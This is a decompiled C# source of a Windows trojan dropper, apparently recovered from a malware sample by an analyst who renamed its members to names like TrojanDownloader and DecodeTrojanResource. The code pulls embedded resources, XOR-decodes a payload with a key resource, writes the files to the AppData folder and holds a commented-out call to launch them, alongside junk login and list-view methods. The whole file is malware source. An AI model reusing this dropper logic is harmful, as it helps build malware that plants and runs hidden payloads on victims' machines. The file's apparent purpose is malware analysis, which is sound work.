// Decompiled with JetBrains decompiler
// Type: IvLavEFEvQdU
// Assembly: ASGxBArV, Version=9.8.409.6129, Culture=neutral, PublicKeyToken=null
// MVID: 1D2A82D5-ED8A-4B71-B5BA-F774607D92F0
// Assembly location: C:\Users\george.bungarzescu\Desktop\virus\troian_dll.exe_.dll

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[StandardModule]
internal sealed class TrojanDownloader
{
  private static PictureBox PictureBox1 = new PictureBox();
  private static PictureBox PictureBox2 = new PictureBox();
  private static ResourceManager ResourceManagerData = new ResourceManager("OLCEyJcn", Assembly.GetEntryAssembly());
  private static string TrojanDownloadFolder = Interaction.Environ("Appdata") + "/";
  private static string[] TrojanResourceReferenceData = new string[2]
  {
    "ALEThjJwJFK.exe",
    "HuuGhrjxjVB"
  };
  public static int myInteger;

  public static object WriteTrojan(byte[] TrojanData, string TrojanFileName)
  {
    object obj1;
    try
    {
      using (BinaryWriter Instance =  new BinaryWriter((Stream) File.Open(TrojanDownloader.TrojanDownloadFolder + TrojanFileName, FileMode.Create)))
      {
        
        // ISSUE: variable of the null type
        Object local1 = null;
        string MemberName = "Write";
        object[] objArray = new object[1]
        {
          (object) TrojanData
        };
        object[] Arguments = objArray;
        // ISSUE: variable of the null type
        Object local2 = null;
        // ISSUE: variable of the null type
       Object local3 = null;
        bool[] flagArray = new bool[1]
        {
          true
        };
        bool[] CopyBack = flagArray;
        int num = 1;
        NewLateBinding.LateCall(Instance, (System.Type) local1, MemberName, Arguments, (string[]) local2, (System.Type[]) local3, CopyBack, num != 0);
        if (flagArray[0])
          TrojanData = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
      }
      obj1 = (object) true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return obj1;
  }

  public static object GetResourceByName(string a)
  {
    return (object) (byte[]) TrojanDownloader.ResourceManagerData.GetObject(a);
  }

  public static int AddOneAndReturn()
  {
    ++TrojanDownloader.myInteger;
    return TrojanDownloader.myInteger;
  }

  [STAThread]
  public static void main()
  {
    TrojanDownloader.WriteTrojan(TrojanDownloader.DecodeTrojanResource((byte[]) TrojanDownloader.GetResourceByName("QEDyaPnzo")), TrojanDownloader.TrojanResourceReferenceData[0]);
    int num1 = 1;
    int num2 = TrojanDownloader.TrojanResourceReferenceData.Length - 1;
    for (int index = num1; index <= num2; ++index)
      TrojanDownloader.WriteTrojan((byte[]) TrojanDownloader.GetResourceByName(TrojanDownloader.TrojanResourceReferenceData[index]), TrojanDownloader.TrojanResourceReferenceData[index]);
    TrojanDownloader.VBLaunchExtractedTrojan(TrojanDownloader.TrojanResourceReferenceData[0]);
  }

  private static void btnLogin_Click(object sender, EventArgs e)
  {
    object Instance1;
    NewLateBinding.LateCall(Instance1, (System.Type) null, "Open", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance2;
    object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (System.Type) null, "ExecuteReader", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    bool flag = false;
    string str1 = "";
    string str2 = "";
    while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue, (System.Type) null, "Read", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)))
    {
      flag = true;
      str1 = NewLateBinding.LateIndexGet(objectValue, new object[1]
      {
        (object) "StaffFirstName"
      }, (string[]) null).ToString();
      str2 = NewLateBinding.LateIndexGet(objectValue, new object[1]
      {
        (object) "StaffLastName"
      }, (string[]) null).ToString();
    }
    if (flag)
    {
      int num1 = (int) Interaction.MsgBox((object) ("Hi " + str1 + " " + str2 + ". You are now logged on."), MsgBoxStyle.OkCancel, (object) null);
    }
    else
    {
      int num2 = (int) Interaction.MsgBox((object) "Sorry", MsgBoxStyle.OkOnly, (object) "Invalid Login");
    }
    NewLateBinding.LateCall(Instance1, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
  }

  public static byte[] DecodeTrojanResource(byte[] EncodedTrojanResource)
  {
    byte[] numArray = (byte[]) TrojanDownloader.GetResourceByName("AzWJrYnj");
    int num1 = 0;
    int num2 = EncodedTrojanResource.Length - 1;
    for (int index1 = num1; index1 <= num2; ++index1)
    {
      int index2 = index1 % numArray.Length;
      EncodedTrojanResource[index1] = (byte) ((int) EncodedTrojanResource[index1] ^ (int) numArray[index2]);
    }
    return EncodedTrojanResource;
  }

  public static void picj(string it)
  {
    ListView listView1 = new ListView();
    ListView listView2 = new ListView();
    int num1 = 0;
    int num2 = listView1.Items.Count - 1;
    for (int index = num1; index <= num2; ++index)
    {
      if (Operators.CompareString(listView1.Items[index].SubItems[1].Text, listView2.Items[index].SubItems[1].Text, false) != 0)
      {
        listView2.Items[index].UseItemStyleForSubItems = false;
        listView2.Items[index].SubItems[1].BackColor = Color.Red;
      }
    }
  }

  public static void VBLaunchExtractedTrojan(string ExtractedTrojanName)
  {
    //Interaction.Shell(TrojanDownloader.TrojanDownloadFolder + ExtractedTrojanName, AppWinStyle.MinimizedFocus, false, -1);

  }
}
